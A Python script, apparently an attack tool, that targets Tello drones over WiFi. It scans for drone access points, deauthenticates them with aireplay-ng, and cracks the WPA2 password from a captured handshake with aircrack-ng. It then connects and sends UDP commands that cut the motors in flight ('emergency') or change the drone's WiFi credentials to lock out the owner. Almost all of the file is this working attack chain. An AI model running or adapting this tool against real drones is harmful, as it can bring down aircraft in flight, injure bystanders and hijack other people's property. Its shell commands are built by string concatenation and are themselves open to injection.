#!/usr/bin/python3

import subprocess
import socket
import time

#Change these values
pcap_file = "some packet capture file with captured WPA2 handshake"
wlist = "whatever word list you want to use for password cracking"

selected_network = ""
target = ""
channel = ""
pp = bool
connected = False

#Drone's IP address and port used to receive commands
command_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
command_addr = ('192.168.10.1', 8889) 

def menu():
    print("Welcome to the Drone Tool")
    if selected_network != "":
        print("=========================")
        print("Targeted Network: " + selected_network)
    print("=========================")
    print("[1] Scan for Drone")
    print("[2] De-authenticate Drone")
    print("[3] Stop Drone")
    print("[4] Change Drone WiFi Details")
    print("[5] Exit\n")

def on_managed():
    try:
        on_managed_c = """ip link set wlan0 down && 
        iw dev wlan0 set type managed && 
        ip link set wlan0 up"""
        subprocess.run(on_managed_c, shell=True)
        print("[+] Interface Set")
    except Exception as e:
        print("Error: ", {e})

def deauth(target):
    try:
        #Add the change channel command if needed (iw dev wlan0 set channel 7)
        on_managed_c = """ip link set wlan0 down && 
        iw dev wlan0 set type monitor && 
        iw dev wlan0 set channel """ + channel + """ && 
        ip link set wlan0 up"""
        print(on_managed_c)
        subprocess.run(on_managed_c, shell=True)
        print("[+] Interface Set")
        print(target)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

    try:
        deauth_c = "aireplay-ng --deauth 10 -a " + target + " wlan0"
        subprocess.run(deauth_c, shell=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

def connectDrone():
    command_socket.bind(('',8889))
    command_socket.sendto(b"command", command_addr)
    command_socket.recvfrom(1024)
    print("[+] Control Taken")

def emergency(command_socket, command_addr):
    command_socket.sendto(b"emergency" , command_addr)
    print ("motor functions stopped")

def wifi_config(command_socket, command_addr):
    ssid = input("New SSID: ")
    password = input("New Password: ")
    command = "wifi " + ssid + " " + password
    command_socket.sendto(command.encode(), command_addr)
    print("WIFI ssid and password changed to:", ssid + " ",  password)

def scan():
    scan_c = "iwlist wlan0 scan | grep -i 'TELLO' | cut -d ':' -f 2"
    print("Scanning...")
    scan = subprocess.check_output(scan_c, shell=True)
    result = scan.decode("ascii").split("\n")
    print("Networks Found")
    print("==============")
    network_list = {}
    count = 0
    for i in result:
        if "TELLO" in i:
            i = i.replace('"', '')
            count += 1
            print(str(count) + ") " + i)
            network_list[count] = i
    if count == 0:
        print("No networks found :(")
    else:
        global selected_network
        selected_network = network_list[int(input("Please select the target network: "))]
        network_info(selected_network)

def network_info(network): #Get SSID and whether got password
    global target, pp, channel
    cmd = "iwlist wlan0 scan | grep " + network + " -B 1 -A 12"
    print("Scanning...")
    exe = subprocess.check_output(cmd, shell=True)
    info_list = exe.decode("ascii").split("\n")
    for line in info_list:
        if "Address:" in line:
            target = line.split("Address: ")[1]
            print("[+] Address acquired")
        elif "Encryption key:on" in line:
            pp = True
            print("[:=/] Password protection present")
        elif "Encryption key:off" in line:
            pp = False
            print("[:-)] No password protection!")
        elif "Frequency:" in line:
            channel = line.split("Channel ")[1].replace(")", "")
            print("[+] Channel acquired")
    print("[+] All information acquired")

def connectToTarget(target, password):
    try:
        global connected
        print(f"[+] Connecting to Wi-Fi network: {target}")
        # Configure the Wi-Fi connection using 'nmcli'
        if pp:
            command = f'nmcli device wifi connect "{target}" password "{password}"'
        else:
            command = f'nmcli device wifi connect "{target}"'
        subprocess.run(command, shell=True, check=True)
        print(f"[+] Connected to Wi-Fi network: {target}")
        connected = True
    except Exception as e:
        print(f"Error occurred: {e}")

def pw_check(): #Check for password and cracks it
    if pp:
        cmd = "aircrack-ng -b " + target + " " + pcap_file + " -w " + wlist + " | grep 'KEY FOUND'"
        run = subprocess.check_output(cmd, shell=True)
        output = run.decode("ascii").split()
        pw = output[3]
        connectToTarget(target, pw)
    else:
        connectToTarget(target)

menu()
s_option = input("Select option (1 - 5): ")

while s_option != "5":
    if s_option == "1":
        on_managed()
        scan()
    elif s_option == "2":
        on_managed()
        deauth(target)
    elif s_option == "3":
        on_managed()
        if not connected:
            pw_check()
            connectDrone()
        time.sleep(2)
        emergency(command_socket, command_addr)
    elif s_option == "4":
        on_managed()
        if not connected:
            pw_check()
            connectDrone()
        wifi_config(command_socket, command_addr)
    else:
        print("Invalid input")

    print() 
    menu()
    s_option = input("Select option (1 - 5): ")
    
print("Thanks for using this! : ^)")
